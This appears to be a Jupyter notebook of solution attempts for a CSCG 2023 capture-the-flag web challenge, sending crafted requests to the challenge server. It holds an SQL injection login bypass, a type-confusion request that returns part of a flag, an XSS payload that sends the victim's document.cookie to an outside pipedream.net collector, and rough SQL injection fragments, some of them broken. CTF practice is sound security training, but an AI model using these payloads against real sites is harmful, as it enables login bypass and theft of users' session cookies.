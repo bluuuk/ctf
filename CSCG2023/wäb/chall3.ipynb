{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import httpx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"Here's the first part of your flag, sha256'd 0 times: CSCG{Q8oIoy3P\""
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "resp = httpx.post(\n",
    "    \"https://aab00bb76f66ad84330f2ecc-intro-web-3.challenge.master.cscg.live:31337/nodejs/random-hashing\",\n",
    "    json={\"chosenNumber\":[]}\n",
    ")\n",
    "\n",
    "resp.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 's956Uwvv' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[21], line 6\u001b[0m\n\u001b[1;32m      1\u001b[0m resp \u001b[39m=\u001b[39m httpx\u001b[39m.\u001b[39mpost(\n\u001b[1;32m      2\u001b[0m     \u001b[39m\"\u001b[39m\u001b[39mhttps://aab00bb76f66ad84330f2ecc-intro-web-3.challenge.master.cscg.live:31337/login.php\u001b[39m\u001b[39m\"\u001b[39m,\n\u001b[1;32m      3\u001b[0m     data\u001b[39m=\u001b[39m\u001b[39mdict\u001b[39m(username\u001b[39m=\u001b[39m\u001b[39m\"\u001b[39m\u001b[39m'\u001b[39m\u001b[39m OR is_admin = \u001b[39m\u001b[39m'\u001b[39m\u001b[39mt\u001b[39m\u001b[39m'\u001b[39m\u001b[39m--\u001b[39m\u001b[39m\"\u001b[39m,password\u001b[39m=\u001b[39m\u001b[39m\"\u001b[39m\u001b[39m\"\u001b[39m)\n\u001b[1;32m      4\u001b[0m )\n\u001b[0;32m----> 6\u001b[0m resp\u001b[39m.\u001b[39mtext,s956Uwvv\n",
      "\u001b[0;31mNameError\u001b[0m: name 's956Uwvv' is not defined"
     ]
    }
   ],
   "source": [
    "resp = httpx.post(\n",
    "    \"https://aab00bb76f66ad84330f2ecc-intro-web-3.challenge.master.cscg.live:31337/login.php\",\n",
    "    data=dict(username=\"' OR is_admin = 't'--\",password=\"\")\n",
    ")\n",
    "\n",
    "resp.text,"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```html\n",
    "<script>\n",
    "    new Image().src=\"https://eousgeihto7n7n6.m.pipedream.net/\"+document.cookie\n",
    "</script>\n",
    "```\n",
    "\n",
    "As the payload to send us the cookie back"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "sql"
    }
   },
   "outputs": [],
   "source": [
    "INSERT INTO GREETING VALUES(\"to\",'message')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "sql"
    }
   },
   "outputs": [],
   "source": [
    "SELECT COUNT(*) FROM GREETINGS);#"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
